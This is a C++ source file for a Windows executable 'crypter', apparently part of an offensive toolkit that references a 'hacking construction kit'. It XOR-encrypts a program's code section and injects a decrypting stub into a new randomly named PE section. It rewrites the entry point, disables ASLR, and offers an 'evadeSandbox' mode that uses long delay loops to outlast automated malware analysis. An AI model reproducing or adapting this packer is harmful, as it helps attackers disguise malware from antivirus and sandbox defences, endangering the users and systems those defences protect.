/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "ccrypter.h"

#include <stdio.h>

#include <Windows.h>
#include <Imagehlp.h>
#pragma comment(lib, "Imagehlp.lib")
#include "../hacking construction kit/extern/ntdll.h"
#pragma comment(lib, "ntdll.lib")

#include "random.h"
#include "macro.h"

char *Crypter::section = ".nsect";

bool Crypter::evadeSandbox = true;

// gets the first sections header offset
#define SECHDROFFSET(a) ((LPVOID) ( (LPBYTE) a                   + \
	((PIMAGE_DOS_HEADER)a)->e_lfanew + \
	sizeof(IMAGE_NT_HEADERS)))

// those are the offsets to the
#define OEP_o 21 // original entry point
#define SEG_o 11 // virtual address of section
#define BSZ_o 1  // block size, must be a multiple of 8
#define  SZ_o 6  // section size, must be a multiple of the chosen block size
// values in the stub


// a simple block xor
// every byte in the given block is XOR'ed with its index
void _xor_block(unsigned char *pblock, unsigned int blocksize){
	unsigned int i;

	for(i = 0; i < blocksize; i++)
		pblock[i] ^= i;

	return;
}

// just a wrapper around the above function
int _xor_chunk(unsigned char* pchunk, unsigned long chunksize, unsigned int blocksize){
	if(chunksize % blocksize || blocksize % 8)
		return -1;

	unsigned long index = 0;

	while(index < chunksize){
		_xor_block(pchunk + index, blocksize);
		index += blocksize;
	}

	return 0;
}

// this is our stub and the new entry point for the encrypted PE
__declspec(naked) void __stdcall _stub(void)
{
	__asm
	{
		push 0xFEFEFEFE //blocksize
			push 0xFDFDFDFD //chunksize
			push 0xFCFCFCFC //pchunk

			call _xor_chunk //decrypt

			mov eax, 0x7FFFFFFF //oep
			jmp eax //go go
	}
}

// a placeholder, used for stub size calculation
__declspec(naked) int _end(void)
{
	__asm ret 8
}


// a simple block xor
// every byte in the given block is XOR'ed with its index
void _xor_block_evade_sandbox(unsigned char *pblock, unsigned int blocksize){
	unsigned int i;

	for(i = 0; i < blocksize; i++)
		pblock[i] ^= i;

	return;
}

// just a wrapper around the above function
int _xor_chunk_evade_sandbox(unsigned char* pchunk, unsigned long chunksize, unsigned int blocksize){
	if(chunksize % blocksize || blocksize % 8)
		return -1;

	unsigned long index = 0;
	char c = 'a';

	while(index < chunksize){
		_xor_block_evade_sandbox(pchunk + index, blocksize);
		index += blocksize;
		for(unsigned long i = 1; i < 1000000000; i++){
			c = i % 2 ? 'b' : 'd';
		}
	}

	return c;
}

// this is our stub and the new entry point for the encrypted PE
__declspec(naked) void __stdcall _stub_evade_sandbox(void)
{
	__asm
	{
		push 0xFEFEFEFE //blocksize
			push 0xFDFDFDFD //chunksize
			push 0xFCFCFCFC //pchunk

			call _xor_chunk_evade_sandbox //decrypt

			mov eax, 0x7FFFFFFF //oep
			jmp eax //go go
	}
}

// a placeholder, used for stub size calculation
__declspec(naked) int _end_evade_sandbox(void)
{
	__asm ret 8
}

bool Crypter::crypt(const char *infile, const char *outfile){
	// variables

	DWORD dwOldProt, bytes;

	// open it and get the size
	HANDLE hFile = CreateFile(infile, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (!hFile){
		MYPRINTF("Unable to open file\n");
		return false;
	}
	DWORD dwFileSize = GetFileSize(hFile, 0);

	// load in memory
	LPBYTE fileBuffer = (LPBYTE) malloc(dwFileSize);
	ReadFile(hFile, fileBuffer, dwFileSize, &bytes, 0);

	CloseHandle(hFile);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) fileBuffer;
	// check if it is valid PE, i would say that this is merely a proper check, for a proper one you would need to calculate all the RVA's and see if they are valid
	if(dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		MYPRINTF("IMAGE_DOS_SIGNATURE\n");
		return false;
	}

	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) (fileBuffer + dosHeader->e_lfanew);
	if(ntHeaders->Signature != IMAGE_NT_SIGNATURE){
		MYPRINTF("IMAGE_NT_SIGNATURE\n");
		return false;
	}


	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER) SECHDROFFSET(fileBuffer);
#define TEXT_SECTION ".text"
	while(memcmp(sectionHeader->Name, TEXT_SECTION, strlen(TEXT_SECTION))) // get the ".text" section header
		sectionHeader++;

	DWORD dwVSize                  = sectionHeader->Misc.VirtualSize; // the virtual size of the section, later this will be used as chunksize in our stub, after proper alignment
	DWORD dwSectionSize    = sectionHeader->SizeOfRawData; // speaks for itself
	DWORD dwStubSize; // the stubsize, in bytes
	if (Crypter::evadeSandbox){
		dwStubSize               = (DWORD) _end_evade_sandbox - (DWORD) _xor_block_evade_sandbox; // the stubsize, in bytes
	} else {
		dwStubSize               = (DWORD) _end - (DWORD) _xor_block; // the stubsize, in bytes
	}

	LPBYTE sectionBuffer = (LPBYTE) malloc(dwSectionSize); // allocate memory enough to hold our raw section data
	memcpy(sectionBuffer, fileBuffer + sectionHeader->PointerToRawData, dwSectionSize); // ... copy the data

	_xor_chunk(sectionBuffer, dwSectionSize, 256); // aaand encrypt it! you can use different block sizes here - 8, 16, 32, 64, 128, 256, 512...
	memset(sectionBuffer + sectionHeader->Misc.VirtualSize, 0, (dwSectionSize - sectionHeader->Misc.VirtualSize)); // fill with zeros after the end of actual data
	// copy back the data
	memcpy(fileBuffer + sectionHeader->PointerToRawData, sectionBuffer, dwSectionSize); // ... copy the data
	free(sectionBuffer);

	DWORD oep = ntHeaders->OptionalHeader.AddressOfEntryPoint + ntHeaders->OptionalHeader.ImageBase; // the original entry point, this is a linear address
	DWORD seg = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase; // the section address, you guessed right, this too is a linear one
	DWORD bsz = 256; // you know what this is

	while(dwVSize % bsz) // we need to align it to block size
		dwVSize++;

	if (Crypter::evadeSandbox){
		VirtualProtect(_xor_block_evade_sandbox, dwStubSize, PAGE_EXECUTE_READWRITE, &dwOldProt); // to be able to update the stub...
	} else {
		VirtualProtect(_xor_block, dwStubSize, PAGE_EXECUTE_READWRITE, &dwOldProt); // to be able to update the stub...
	}

	// and update it, blah, blah, blah...
	if (Crypter::evadeSandbox){
		memcpy((void *)((unsigned long) _stub_evade_sandbox + OEP_o), &oep, 4);
		memcpy((void *)((unsigned long) _stub_evade_sandbox + SEG_o), &seg, 4);
		memcpy((void *)((unsigned long) _stub_evade_sandbox + BSZ_o), &bsz, 4);
		memcpy((void *)((unsigned long) _stub_evade_sandbox +  SZ_o), &dwVSize, 4);
	} else {
		memcpy((void *)((unsigned long) _stub + OEP_o), &oep, 4);
		memcpy((void *)((unsigned long) _stub + SEG_o), &seg, 4);
		memcpy((void *)((unsigned long) _stub + BSZ_o), &bsz, 4);
		memcpy((void *)((unsigned long) _stub +  SZ_o), &dwVSize, 4);
	}

	
	Crypter::section = new char [6];
	Random::createRandomName(COUNTOF(Crypter::section), Crypter::section);
	char* resDll;
	DWORD szResDll;
	if (Crypter::evadeSandbox){
		if (!Crypter::insertSectionConfigInPE(fileBuffer, dwFileSize, _xor_block_evade_sandbox, dwStubSize + sizeof(int), (PVOID*)(&resDll), &szResDll )){
			MYPRINTF("problem with injection\n");
			delete Crypter::section;
			return false;
		}	
	} else {
		if (!Crypter::insertSectionConfigInPE(fileBuffer, dwFileSize, _xor_block, dwStubSize + sizeof(int), (PVOID*)(&resDll), &szResDll )){
			MYPRINTF("problem with injection\n");
			delete Crypter::section;
			return false;
		}
	}

	free(fileBuffer);

	fileBuffer = (LPBYTE)resDll;

	dosHeader = (PIMAGE_DOS_HEADER) fileBuffer;
	// check if it is valid PE, i would say that this is merely a proper check, for a proper one you would need to calculate all the RVA's and see if they are valid
	if(dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		MYPRINTF("IMAGE_DOS_SIGNATURE\n");
		delete Crypter::section;
		return false;
	}

	ntHeaders = (PIMAGE_NT_HEADERS) (fileBuffer + dosHeader->e_lfanew);
	if(ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		MYPRINTF("IMAGE_NT_SIGNATURE\n");
		delete Crypter::section;
		return false;
	}
	ntHeaders->OptionalHeader.DllCharacteristics = ntHeaders->OptionalHeader.DllCharacteristics & ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

	sectionHeader = (PIMAGE_SECTION_HEADER) SECHDROFFSET(fileBuffer);
	while(memcmp(sectionHeader->Name, Crypter::section, strlen(Crypter::section))) // get the ".fpbcfg" section header
		sectionHeader++;

	sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE; 
	// R/W/E, executable code, initialized data. although my experience shows that you are just fine with R/W...
	if (Crypter::evadeSandbox){
		ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress + ((DWORD)_stub_evade_sandbox - (DWORD)_xor_block_evade_sandbox);
	} else {
		ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress + ((DWORD)_stub - (DWORD)_xor_block);
	}
	

	sectionHeader = (PIMAGE_SECTION_HEADER) SECHDROFFSET(fileBuffer);
	while(memcmp(sectionHeader->Name, TEXT_SECTION, strlen(TEXT_SECTION))) // get the ".text" section header
		sectionHeader++;

	sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE; 
	// R/W/E, executable code, initialized data. although my experience shows that you are just fine with R/W...

	bool res = true;
	if (!Crypter::saveFile(outfile, resDll, szResDll)){
		res = false;
		MYPRINTF("Unable to save file\n");
	}

	free(fileBuffer);
	delete Crypter::section;

	return res;
}



#define ALIGN_DOWN(x, align) (x &~ (align - 1))
#define ALIGN_UP(x, align) ((x & (align - 1)) ? ALIGN_DOWN(x, align) + align:x)

DWORD Crypter::freeSpaceInHeader(PVOID pvPEBase){

	PIMAGE_NT_HEADERS pNtHeaders = RtlImageNtHeader(pvPEBase);
	if (pNtHeaders)	{
		PIMAGE_SECTION_HEADER pFirstSection = IMAGE_FIRST_SECTION(pNtHeaders);
		return (pFirstSection->PointerToRawData - ((DWORD)pFirstSection - (DWORD)pvPEBase) - (pNtHeaders->FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER));
	}

	return 0;
}

PIMAGE_SECTION_HEADER Crypter::getVirtualyLastSectionHeader(PIMAGE_NT_HEADERS pNtHeaders){

	PIMAGE_SECTION_HEADER pFirstSection = IMAGE_FIRST_SECTION(pNtHeaders);
	return &pFirstSection[pNtHeaders->FileHeader.NumberOfSections - 1];
}

PIMAGE_SECTION_HEADER Crypter::getPhysicalyLastSectionHeader(PIMAGE_NT_HEADERS pNtHeaders){

	PIMAGE_SECTION_HEADER pFirstSection = IMAGE_FIRST_SECTION(pNtHeaders);
	PIMAGE_SECTION_HEADER pLastSection = pFirstSection;

	if (1 == pNtHeaders->FileHeader.NumberOfSections) return pLastSection;

	for	(DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i)	{
		if (pLastSection->PointerToRawData < pFirstSection->PointerToRawData) pLastSection = pFirstSection;
		++pFirstSection;
	}

	return pLastSection;
}

PIMAGE_SECTION_HEADER Crypter::insertSectionHeader(PVOID pvPEBase, LPCSTR lpName, DWORD dwVirtualSize, DWORD dwCharacteristics, PDWORD pdwSize){
	if (strlen(lpName) > 7) {
		MYPRINTF("strlen(lpName) > 7\n");
		return NULL;
	}

	if (Crypter::freeSpaceInHeader(pvPEBase) < IMAGE_SIZEOF_SECTION_HEADER) {
		MYPRINTF("freeSpaceInHeader\n");
		return NULL;
	}

	PIMAGE_NT_HEADERS pNtHeaders = RtlImageNtHeader(pvPEBase);
	if (!pNtHeaders) {
		MYPRINTF("!pNtHeaders\n");
		return NULL;
	}

	DWORD dwSizeOfRawData = ALIGN_UP(dwVirtualSize, pNtHeaders->OptionalHeader.FileAlignment);
	dwVirtualSize = ALIGN_UP(dwVirtualSize, pNtHeaders->OptionalHeader.SectionAlignment);

	PIMAGE_SECTION_HEADER pNewSection = (PIMAGE_SECTION_HEADER)malloc(IMAGE_SIZEOF_SECTION_HEADER);
	if (!pNewSection) {
		MYPRINTF("!pNewSection\n");
		return NULL;
	}

	memset( pNewSection, 0, IMAGE_SIZEOF_SECTION_HEADER);
	memcpy((PVOID)(&pNewSection->Name), (PVOID)lpName, strlen(lpName));
	pNewSection->Characteristics = dwCharacteristics;
	pNewSection->Misc.VirtualSize = dwVirtualSize;
	pNewSection->SizeOfRawData = dwSizeOfRawData;

	PIMAGE_SECTION_HEADER pVirtualLastSection = Crypter::getVirtualyLastSectionHeader(pNtHeaders);
	pNewSection->VirtualAddress = pVirtualLastSection->VirtualAddress + ALIGN_UP(pVirtualLastSection->Misc.VirtualSize,pNtHeaders->OptionalHeader.SectionAlignment);	

	if (dwSizeOfRawData){ 
		PIMAGE_SECTION_HEADER pLastSection = Crypter::getPhysicalyLastSectionHeader(pNtHeaders);

		pNewSection->PointerToRawData = pLastSection->PointerToRawData + ALIGN_UP(pLastSection->SizeOfRawData, pNtHeaders->OptionalHeader.FileAlignment);
	}

	*pdwSize = dwVirtualSize;

	return pNewSection;
}

BOOL Crypter::insertSectionConfigInPE(PVOID pvPEBase,DWORD dwPESize,PVOID pvData,DWORD dwDataSize,PVOID *ppvNewPE,DWORD *pdwNewPESize){
	BOOL bRet = FALSE;
	PIMAGE_SECTION_HEADER pNewSection;
	DWORD dwSize;
	if (pNewSection = Crypter::insertSectionHeader( pvPEBase, Crypter::section, dwDataSize, IMAGE_SCN_CNT_INITIALIZED_DATA|IMAGE_SCN_MEM_READ,&dwSize)){
		PVOID pvNewPE;
		DWORD dwNewPESize = pNewSection->PointerToRawData + pNewSection->SizeOfRawData;

		if (pvNewPE = malloc(dwNewPESize)){
			memcpy(pvNewPE, pvPEBase, dwPESize);

			PIMAGE_NT_HEADERS pNtHeaders = RtlImageNtHeader(pvNewPE);

			++(pNtHeaders->FileHeader.NumberOfSections);

			PIMAGE_SECTION_HEADER pVirtualLastSection = Crypter::getVirtualyLastSectionHeader(pNtHeaders);
			pVirtualLastSection[0] = *pNewSection;

			pNtHeaders->OptionalHeader.SizeOfImage += dwSize;

			memcpy((PVOID)((DWORD)pvNewPE + pNewSection->PointerToRawData),pvData,dwDataSize);

			DWORD dwHeaderSum, dwCheckSum;

			if (CheckSumMappedFile(pvNewPE,dwNewPESize,&dwHeaderSum,&dwCheckSum)){
				pNtHeaders->OptionalHeader.CheckSum = dwCheckSum;

				*ppvNewPE = pvNewPE;
				*pdwNewPESize = dwNewPESize;

				bRet = TRUE;
			}

			if (!bRet) free(pvNewPE);
		} else {
			MYPRINTF(" malloc(dwNewPESize)\n");
		}

		free(pNewSection);
	} else {
		MYPRINTF("!insertSectionHeader\n");
	}
	return bRet;
}

bool Crypter::saveFile(const char* nameFile, char* data, int sz ){
	HANDLE fout = CreateFile(nameFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
	if (fout == INVALID_HANDLE_VALUE) {
		return false;
	}
	DWORD rl;
	WriteFile(fout, data, sz, &rl, 0);
	CloseHandle(fout);
	return true;
}




